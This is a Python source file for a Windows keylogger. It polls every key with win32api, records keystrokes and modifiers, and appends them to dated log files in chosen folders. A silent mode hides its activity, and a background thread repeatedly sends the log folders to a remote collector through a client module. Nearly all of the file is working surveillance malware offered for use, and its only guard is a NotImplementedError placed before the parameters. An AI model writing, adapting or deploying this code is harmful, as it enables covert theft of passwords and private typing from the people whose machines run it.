import time
import sys
import os
import time
import threading
import platform
from keymap import *
from common import Output, thread_refresh

### change parameters here ###
raise NotImplementedError('Set parameters before execution. You can refer to the latest version in appendix')
save_dirs       = []
update_interval = 3
SilentMode      = False    # no output
##############################

MAX_KEYLOGGER_BUF = 1024

if platform.system() == 'Windows':
    import win32api
    
    def keylogger(SaveDirs=[], silentMode=SilentMode):
        write         = Output(silentMode)
        result        = ''
        while True:
            name   = ''
            for code in range(8, 256):
                if code in [VK_CONTROL, VK_MENU, VK_SHIFT, VK_CAPITAL, VK_NUMLOCK]:
                    continue
                status = win32api.GetAsyncKeyState(code)
                if status & 1 != 1: continue
                CtrlKey  = win32api.GetKeyState(VK_CONTROL) < 0
                AltKey   = win32api.GetKeyState(VK_MENU) < 0
                ShiftKey = win32api.GetKeyState(VK_SHIFT) < 0
                CapsLock = win32api.GetKeyState(VK_CAPITAL) & 1 == 1
                NumLock  = win32api.GetKeyState(VK_NUMLOCK) & 1 == 1
                # upper    = ShiftKey != CapsLock
                Modifier = []
                if CtrlKey:   Modifier.append('Control')
                if AltKey:    Modifier.append('Alt')
                if ShiftKey:  Modifier.append('Shift')
                character = keymap.get(code)
                if character is None:
                    continue
                name = '-'.join(Modifier + [character])
                if VK_A <= code <= VK_Z and not Modifier and CapsLock:
                    name = character.upper()
                if VK_NUMPAD0 <= code <= VK_DIVIDE and NumLock and keymap.get('NumLock-' + name):
                    name = keymap.get('NumLock-' + name)
                elif keymap.get(name):
                    name = keymap.get(name)
                if len(name) > 1 or ord(name) > 255:
                    name = '[' + name + ']'
                write(name, end='\n' if code == VK_RETURN else '')
                result += name
            if len(result) > MAX_KEYLOGGER_BUF:
                result  = result[-MAX_KEYLOGGER_BUF:]
            if result:
                fileName = time.strftime('%Y%m%d') + '.txt'
                for SaveDir in SaveDirs:
                    try:
                        if not os.path.exists(SaveDir):
                            os.makedirs(SaveDir)
                        fullName = os.path.join(SaveDir, fileName)
                        with open(fullName, 'a') as fp:
                            fp.write(result)
                        result = ''
                    except:
                        logging.debug('Can\'t open %s', fullName)
                        continue
            result = ''
            time.sleep(0.01)

else:
    def keylogger(SaveDirs=[], silentMode=SilentMode):
        pass

if __name__ == '__main__':
    threads = []
    if platform.system() == 'Windows':
        import client
        def send_log():
            while True:
                for SaveDir in save_dirs if isinstance(save_dirs, list) else [save_dirs]:
                    client.send_dir(SaveDir)
                time.sleep(update_interval)
        thread = threading.Thread(target=send_log)
        thread.start()
        threads.append(thread)
    thread = threading.Thread(target=keylogger, args=(save_dirs, SilentMode))
    thread.start()
    threads.append(thread)
    while threads:
        threads = thread_refresh(threads)
